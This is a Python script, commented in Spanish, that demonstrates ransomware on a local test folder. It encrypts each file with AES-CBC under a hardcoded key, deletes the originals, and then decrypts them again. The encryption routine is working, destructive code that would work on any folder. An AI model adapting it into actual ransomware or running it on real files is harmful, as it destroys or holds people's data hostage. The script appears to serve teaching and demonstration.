"""
Ransomware Simulation with AES Encryption

Este script simula el comportamiento de un ransomware cifrando y descifrando archivos
utilizando el algoritmo AES en modo CBC. Cada archivo cifrado es eliminado después de la
operación y reemplazado por su versión cifrada con la extensión ".enc".

@author: Autor del código
@version: 1.0
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
from Crypto.Random import get_random_bytes

# Configuración de clave AES
KEY = b'1234567890abcdef'  # Clave de 16 bytes (AES-128)

def ransomware_encrypt(folder_path: str, key: bytes) -> None:
    """
    Cifra todos los archivos en una carpeta utilizando AES en modo CBC.
    Cada archivo es reemplazado por su versión cifrada con la extensión ".enc".

    @param folder_path: Ruta de la carpeta donde están los archivos a cifrar.
    @param key: Clave AES de 16 bytes.
    """
    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            iv = get_random_bytes(16)  # Generar IV único por archivo
            cipher = AES.new(key, AES.MODE_CBC, iv)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            
            with open(file_path + ".enc", 'wb') as f:
                f.write(iv + ciphertext)  # Guardar IV + datos cifrados
            os.remove(file_path)

def ransomware_decrypt(folder_path: str, key: bytes) -> None:
    """
    Descifra todos los archivos en una carpeta que tengan la extensión ".enc".
    Los archivos cifrados son eliminados y reemplazados por sus versiones originales.

    @param folder_path: Ruta de la carpeta donde están los archivos cifrados.
    @param key: Clave AES de 16 bytes.
    """
    for file in os.listdir(folder_path):
        if file.endswith(".enc"):
            file_path = os.path.join(folder_path, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            
            iv, ciphertext = data[:16], data[16:]  # Extraer IV y datos cifrados
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            
            original_path = file_path.replace(".enc", "")
            with open(original_path, 'wb') as f:
                f.write(plaintext)
            os.remove(file_path)

# Simulación de ransomware
ransomware_encrypt("./ransonware_test", KEY)
print("Archivos cifrados en ransonware_test")

ransomware_decrypt("./ransonware_test", KEY)
print("Archivos descifrados en ransonware_test")
